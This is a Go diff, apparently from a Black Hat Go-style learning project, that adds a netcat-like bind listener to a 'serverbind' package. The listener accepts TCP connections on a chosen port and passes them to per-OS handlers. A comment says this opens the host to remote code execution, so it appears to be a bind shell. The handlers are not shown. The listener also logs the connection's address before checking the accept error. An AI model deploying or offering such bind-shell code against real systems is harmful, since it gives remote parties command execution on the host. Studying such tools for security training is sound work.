@@ -1,6 +1,7 @@
 package serverbind
 
 import (
+	"blackhat-go/scannertools"
 	"bufio"
 	"fmt"
 	"io"
@@ -15,6 +16,46 @@ func OperatingSystemDetect() *string {
 	// Return the operating system runtime
 	var osRuntime string = runtime.GOOS
 	return &osRuntime
+}
+
+type ServerBindUserInputNetcat struct {
+	scannertools.UserInputNetcat
+}
+
+func (uin *ServerBindUserInputNetcat) NcBindTwo() {
+	var (
+		port      int    = uin.Port
+		address   string = fmt.Sprintf(":%d", port)
+		osRuntime string = runtime.GOOS
+	)
+
+	listener, err := net.Listen("tcp", address)
+	if err != nil {
+		log.Fatalf("Unable to bind to port %s", address)
+	}
+	switch osRuntime {
+	case "linux":
+		for {
+			conn, err := listener.Accept()
+			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+			if err != nil {
+				log.Fatalln("Unable to accept connection.")
+			}
+			go SimpleHandleLinux(conn)
+		}
+	case "windows":
+		for {
+			conn, err := listener.Accept()
+			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+			if err != nil {
+				log.Fatalln("Unable to accept connection.")
+			}
+			go SimpleHandleWindows(conn)
+		}
+	default:
+		fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
+		os.Exit(1)
+	}
 }
 
 // Bind to local port, open up host to remote code execution
